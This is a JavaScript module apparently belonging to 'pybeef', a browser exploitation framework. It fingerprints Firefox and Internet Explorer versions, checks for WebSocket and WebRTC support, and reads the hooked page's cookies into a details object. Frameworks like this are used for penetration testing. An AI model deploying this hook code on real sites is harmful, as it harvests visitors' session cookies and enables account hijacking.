pybeef.browser = {

    isFF : function(){
    	return window.navigator.userAgent.match(/Firefox\/.+/)!=null;
    },

    isIE6: function () {
        return !window.XMLHttpRequest && !window.globalStorage;
    },


    isIE7: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !window.getComputedStyle && !window.globalStorage && !document.documentMode;
    },

    isIE8: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
    },

    isIE9: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints === "undefined";
    },


    isIE10: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined";
    },


    isIE11: function () {
        return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints !== "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },
    
    isIEedge: function() {
        return !!window.XMLHttpRequest && !!window.chrome && !window.opera && !document.documentMode && !!window.performance && typeof navigator.msMaxTouchPoints == "undefined" && typeof document.selection === "undefined" && typeof document.createStyleSheet === "undefined" && typeof window.createPopup === "undefined" && typeof window.XDomainRequest === "undefined";
    },

    isIE: function () {
        return this.isIE6() || this.isIE7() || this.isIE8() || this.isIE9() || this.isIE10() || this.isIE11() || this.isIEedge();
    },


	getBrowserVersion: function(){
		var FF = window.navigator.userAgent.match(/Firefox\/.+/); 
		if(this.isFF()){ return FF;}
		if(this.isIE6()){ return "IE6";}
		if(this.isIE7()){ return "IE7";}
		if(this.isIE8()){ return "IE8";}
		if(this.isIE9()){ return "IE9";}
		if(this.isIE10()){ return "IE10";}
		if(this.isIE11()){ return "IE11";}
        if(this.isIEedge()){return "IEedge";}
//		if(this.isIEedge()){ return "IE edge";}		
		},

    hasWebSocket: function () {
        return !!window.WebSocket || !!window.MozWebSocket;
    },
    
    hasWebRTC: function () {
        return (!!window.mozRTCPeerConnection || !!window.webkitRTCPeerConnection);
    },

    getBrowserDetails:function(){
 		var details = new Array();
 		var browser_version = this.getBrowserVersion();
 		if(browser_version){ details['version'] = browser_version ;}
 		try{
            var cookies = document.cookie;
//            console.log(cookies.replace(/[;|"]/g,"+++"));
            if (cookies) details['Cookies'] = cookies;
        } catch (e) {
            details['Cookies'] = "Cookies can't be read. The hooked origin is most probably using HttpOnly.";
        }
    
    	return details;
    }
};

var browser_details = pybeef.browser.getBrowserDetails();
pybeef.regcmp('pybeef.browser');